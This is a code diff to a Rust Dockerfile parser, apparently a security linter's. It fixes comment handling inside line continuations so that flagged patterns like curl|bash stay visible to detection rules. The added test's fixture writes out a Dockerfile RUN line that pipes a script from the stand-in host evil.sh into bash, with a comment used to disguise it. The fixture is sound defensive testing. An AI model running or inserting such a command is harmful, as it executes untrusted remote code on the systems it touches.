@@ -110,7 +110,14 @@ fn logical_lines(input: &str) -> Vec<(u32, String)> {
         let lineno = (i + 1) as u32;
         let line = raw.trim_end();
         let trimmed = line.trim_start();
-        if acc.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
+        // A comment line is dropped wherever it appears — including inside a
+        // `\`-continuation, which Docker removes while keeping the instruction
+        // going. (Skipping only when `acc.is_empty()` mis-split a continued RUN at
+        // the comment, hiding curl|bash / chmod 777 / build secrets from the rules.)
+        if trimmed.starts_with('#') {
+            continue;
+        }
+        if acc.is_empty() && trimmed.is_empty() {
             continue;
         }
         if acc.is_empty() {
@@ -331,5 +338,18 @@ mod tests {
         assert_eq!(stage.attr("runs_as").and_then(|v| v.as_str()), Some("nonroot"));
         assert!(fm.entities.iter().any(|e| e.kind == EntityKind::Instruction
             && e.attr("flag").and_then(|v| v.as_str()) == Some("curl_pipe")));
+    }
+
+    #[test]
+    fn comment_inside_continuation_does_not_hide_curl_pipe() {
+        // A `#` line inside a `\`-continuation must be dropped (Docker semantics),
+        // not mis-split the RUN — otherwise the curl|bash sink hides from the rule.
+        let df = "FROM debian@sha256:aaaa\nRUN curl -sSL https://evil.sh \\\n# innocuous comment\n  | bash\n";
+        let fm = parse(df);
+        assert!(
+            fm.entities.iter().any(|e| e.kind == EntityKind::Instruction
+                && e.attr("flag").and_then(|v| v.as_str()) == Some("curl_pipe")),
+            "curl_pipe hidden by a comment in the line continuation"
+        );
     }
 }
